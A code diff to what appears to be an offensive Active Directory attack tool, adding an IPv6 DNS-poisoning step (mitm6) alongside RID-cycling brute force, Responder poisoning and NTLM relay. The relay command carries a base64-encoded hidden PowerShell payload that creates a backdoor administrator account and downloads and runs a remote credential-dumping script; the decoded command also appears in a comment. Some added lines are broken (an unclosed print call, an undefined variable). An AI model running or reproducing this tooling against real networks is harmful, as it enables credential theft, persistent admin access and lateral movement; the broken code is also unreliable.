@@ -31,7 +31,7 @@ def parse_args():
     parser.add_argument("-l", "--hostlist", help="Host list file")
     parser.add_argument("-x", "--xml", help="Path to Nmap XML file")
     parser.add_argument("-p", "--password-list", help="Path to password list file")
-    parser.add_argument("-s", "--skip", default='', help="Skip [rid/scf/responder/ntlmrelay/crack] where the first 4 options correspond to attacks 1-4")
+    parser.add_argument("-s", "--skip", default='', help="Skip [rid/scf/responder/ntlmrelay/dns/crack] where the first 5 options correspond to attacks 1-5")
     parser.add_argument("-t", "--time", default='10', help="Number of minutes to run the LLMNR/Responder attack; defaults to 10m")
     return parser.parse_args()
 
@@ -326,19 +326,23 @@ def get_null_sess_hosts(output):
 
     return null_sess_hosts
 
-def print_domains(null_sess_hosts):
+def get_AD_domains(null_sess_hosts):
     '''
     Prints the unique domains
     '''
     uniq_doms = []
+
     for key,val in null_sess_hosts.items():
         dom_name = val[0]
+
         if dom_name not in uniq_doms:
             uniq_doms.append(dom_name)
 
     if len(uniq_doms) > 0:
         for d in uniq_doms:
             print('[+] Domain found: ' + d) 
+
+    return uniq_doms
 
 def get_usernames(ridenum_output, prev_users):
     '''
@@ -501,7 +505,7 @@ def smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users):
             print('[+] Null session found: {}'.format(ip))
             null_hosts.append(ip)
 
-    print_domains(null_sess_hosts)
+    domains = get_AD_domains(null_sess_hosts)
 
     # Gather usernames using ridenum.py
     print('[*] Checking for usernames. This may take a bit...')
@@ -525,7 +529,7 @@ def smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users):
     # Will always return at least an empty dict()
     prev_creds = parse_brute_output(brute_output, prev_creds)
 
-    return prev_creds, prev_users
+    return prev_creds, prev_users, domains
 
 def log_pwds(host_user_pwds):
     '''
@@ -710,9 +714,10 @@ def start_responder_llmnr():
     print('[*] Responder-Session.log:')
     return resp_proc
 
-def run_relay_attack():
+def run_relay_attack(domains):
     '''
     Start ntlmrelayx for ntlm relaying
+    We don't need the var domains yet, but maybe in future
     '''
     iface = get_iface()
     edit_responder_conf('Off', ['HTTP', 'SMB'])
@@ -720,11 +725,12 @@ def run_relay_attack():
     resp_proc = run_proc(resp_cmd)
 
 # net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Obf-Cats/master/Obf-Cats.ps1'); Obf-Cats -pwds
-    relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py'
+    relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
                 ' -of hashes/ntlmrelay-hashes -tf smb-signing-disabled-hosts.txt'
                 ' -c "powershell -nop -exec bypass -w hidden -enc '
                 'bgBlAHQAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBEAGEAbgBNAGMASQBuAGUAcgBuAGUAeQAvAE8AYgBmAC0AQwBhAHQAcwAvAG0AYQBzAHQAZQByAC8ATwBiAGYALQBDAGEAdABzAC4AcABzADEAJwApADsAIABPAGIAZgAtAEMAYQB0AHMAIAAtAHAAdwBkAHMADQAKAA==')
     ntlmrelay_proc = run_proc(relay_cmd)
+
     return resp_proc, ntlmrelay_proc
 
 def follow_file(thefile):
@@ -870,6 +876,15 @@ def cleanup_responder(resp_proc, prev_creds):
 
     return prev_creds
 
+def cleanup_mitm6(mitm6_proc):
+    '''
+    SIGINT mitm6
+    '''
+    pid = mitm6_proc.pid
+    os.kill(pid, signal.SIGINT)
+    if not p.poll():
+        print('[*] Waiting on mitm6 to cleanly shut down...')
+
 def get_user_from_ntlm_hash(ntlm_hash):
     '''
     Gets the username in form of LAB\\uame from ntlm hash
@@ -931,12 +946,27 @@ def parse_ntlmrelay_line(line, successful_auth, prev_creds, args):
 
     return prev_creds, successful_auth
 
-def do_ntlmrelay(prev_creds, args):
+def run_ipv6_dns_poison():
+    '''
+    Runs mitm6 to poison DNS via IPv6
+    '''
+    cmd = 'mitm6'
+    mitm6_proc = run_proc(cmd)
+
+    return mitm6_proc
+
+def do_ntlmrelay(prev_creds, args, domains):
     '''
     Continuously monitor and parse ntlmrelay output
     '''
+    mitm6_proc = None
+
     print('\n[*] Attack 4: NTLM relay with Responder and ntlmrelayx')
-    resp_proc, ntlmrelay_proc = run_relay_attack()
+    resp_proc, ntlmrelay_proc = run_relay_attack(domains)
+
+    if 'dns' not in args.skip:
+        print('\n[*] Attack 5: IPv6 DNS Poison'
+        mitm6_proc = run_ipv6_dns_poison()
 
     ########## CTRL-C HANDLER ##############################
     def signal_handler(signal, frame):
@@ -955,6 +985,10 @@ def do_ntlmrelay(prev_creds, args):
         # Clean up SCF file
         remote_scf_cleanup()
 
+        # Kill mitm6
+        if mitm6_proc:
+            cleanup_mitm6(mitm6_proc)
+
         sys.exit()
 
     signal.signal(signal.SIGINT, signal_handler)
@@ -964,6 +998,7 @@ def do_ntlmrelay(prev_creds, args):
     print('[*] ntlmrelayx.py output:')
     ntlmrelay_file = open('logs/ntlmrelayx.py.log', 'r')
     file_lines = follow_file(ntlmrelay_file)
+
     successful_auth = False
     for line in file_lines:
         # Parse ntlmrelay output
@@ -1058,7 +1093,7 @@ def main(report, args):
 
         # ATTACK 1: RID Cycling into reverse bruteforce
         if 'rid' not in args.skip.lower():
-            prev_creds, prev_users = smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users)
+            prev_creds, prev_users, domains = smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users)
 
         # ATTACK 2: SCF file upload to writeable shares
         parse_nse(hosts, args)
@@ -1094,8 +1129,9 @@ def main(report, args):
             time.sleep(2)
 
     # ATTACK 4: NTLM relay
+    # ATTACK 5: IPv6 DNS WPAD spoof
     if 'relay' not in args.skip.lower() and len(hosts) > 0:
-        do_ntlmrelay(prev_creds, args)
+        do_ntlmrelay(prev_creds, args, domains)
 
 if __name__ == "__main__":
     args = parse_args()
